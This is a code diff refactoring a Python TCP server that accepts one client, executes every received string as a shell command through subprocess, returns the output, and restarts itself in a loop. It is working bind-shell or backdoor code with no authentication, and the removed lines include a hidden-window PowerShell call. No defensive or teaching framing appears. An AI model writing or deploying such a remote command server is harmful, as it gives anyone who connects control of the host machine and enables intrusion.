@@ -1,104 +1,95 @@
-import socket
+import socket as SocketLib
 import os
 import subprocess
+import Functions
+import Settings
 
-ip = ""
-port = 9776
-queue = 1
-timeout = 1
-cc = "s_end" # server_end - command to off the server
-splitter = '////////////////////\\\\\\\\\\\\\\\\\\\\'
-def_shell_command = ""
-dsc_spl = ""
+
+OutputSplitter = Settings.OutputSplitter
+DefaultShell = Settings.VoidString
+ShellCommandSplitter = Settings.NDefaultShellCommandSplitter
+
 
 
 def Start():
-    global def_shell_command, dsc_spl
+    global DefaultShell, ShellCommandSplitter
 
+    Message = Settings.VoidString
+    ServerSocket = Functions.CreateSocket(SocketLib.AF_INET, SocketLib.SOCK_STREAM)
 
-    msg = None
-
-    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-
-    try:
-        sock.bind((ip, port))
-    except:
-        print("binding error...")
-
-    sock.listen(queue)
-
-    sock2, info = sock.accept()
-
-    print(info) 
-
-    print('accepted...')
-
-
-    while msg != cc:
-        a = ""
-        msg = ""
-        print(splitter)
-
-        try:
-            print('waiting for command')
-            msg = sock2.recv(1024).decode()
-            print('after recv')
-            print("tried")
-            print(msg)
-            if msg == "":
-                print("Connection was refused by client... Reaccepting...")
-                return -2
-        except:
-            print('could NOT')
-            return -1
-
-        if msg == "DSC":
-            sock2.send('Set default shell command...'.encode())
-            def_shell_command = sock2.recv(1024).decode()
-            
-            if def_shell_command == "":
-                dsc_spl = ""
-            else:
-                dsc_spl = " "
-            sock2.send(f'Now default shell is {def_shell_command}'.encode())
-        else:
-            #try:
-            args = def_shell_command+dsc_spl+msg
-            print(f'args === {args}')
-            try:
-                a = str(subprocess.run(args, stdout=subprocess.PIPE))
-                print(a)
-            except:
-                sock2.send("Shell error... Check your command.".encode())
-
-            sock2.send(a.encode())
-            print(f'\ncommand === {msg} ===')
-            print(splitter)
-
-
-
-    sock.close()
-    sock2.close()
-
-
-
+    if Functions.Bind(ServerSocket, Settings.AcceptingIp, Settings.ServerPort) == -1:
+        print(Settings.BindErrorMessage)
+        return Settings.ErrorCode
     
 
 
+    ServerSocket.listen(Settings.ServerQueue)
 
-    a = subprocess.run('Powershell.exe -WindowStyle hidden pwd', shell=True)
-    print()
-    print(a)
+    ClientSocket, ClientInfo = ServerSocket.accept()
+
+    Functions.CheckAndPrint(Settings.DebugOutputFlag, ClientInfo) 
+
+    Functions.CheckAndPrint(Settings.DebugOutputFlag, Settings.AcceptMessage) 
+
+
+    while Message != Settings.ServerEndCommand:
+        CommandOutput = Settings.VoidString
+        Message = Settings.VoidString
+        print(Settings.OutputSplitter)
+
+        try:
+            Functions.CheckAndPrint(Settings.DebugOutputFlag, Settings.CommandWaitingMessage)
+            Message = Functions.RecvAndDecode(ClientSocket, Settings.Frame)
+            #Message = ClientSocket.recv(Frame).decode()
+            print(Message)
+
+            if Message == Settings.VoidString:
+                print(Settings.RefusedConnectionMessage)
+                return Settings.ErrorCode
+        except:
+            print(Settings.RecvErrorMessage)
+            return Settings.ErrorCode
+
+        if Message == Settings.SetDefaultShellCommand:
+            Functions.SendAndEncode(ClientSocket, Settings.SetDefaultShellCommandMessage)
+            DefaultShell = Functions.RecvAndDecode(ClientSocket, Settings.Frame) 
+
+            if DefaultShell == Settings.RemoveDefaultShell:
+                DefaultShell = Settings.VoidString
+                Functions.CheckAndPrint(Settings.DebugOutputFlag, Settings.RemovedDefaultShellMessage)
+                ShellCommandSplitter = Settings.NDefaultShellCommandSplitter
+                Functions.SendAndEncode(ClientSocket, Settings.RemovedDefaultShellMessage)
+
+            else:
+                ShellCommandSplitter = Settings.YDefaultShellCommandSplitter # " "
+                Functions.SendAndEncode(ClientSocket, Settings.DefaultShellMessage + Settings.SpaceSplitChar + DefaultShell)
+
+        else:
+            Command = DefaultShell + ShellCommandSplitter + Message
+
+            try:
+                print(Command)
+                CommandOutput = str(subprocess.run(Command, stdout=subprocess.PIPE))
+                print(CommandOutput)
+
+            except:
+                Functions.SendAndEncode(ClientSocket, Settings.ShellErrorMessage)
+
+            Functions.SendAndEncode(ClientSocket, CommandOutput)
+            print(Settings.OutputSplitter)
 
 
 
+    ServerSocket.close()
+    ClientSocket.close()
+
+    return Settings.SuccessfulCode
 
 
 if __name__ == "__main__":
+    rc = 1
+    while rc != 0:
+        print('Restart...')
+        rc = Start()
 
-    RC = 1 # returned code
-    while RC != 0:
-        print("rc")
-        RC = Start()
-
-    print('eop')
+    print(Settings.EndOfProgram)
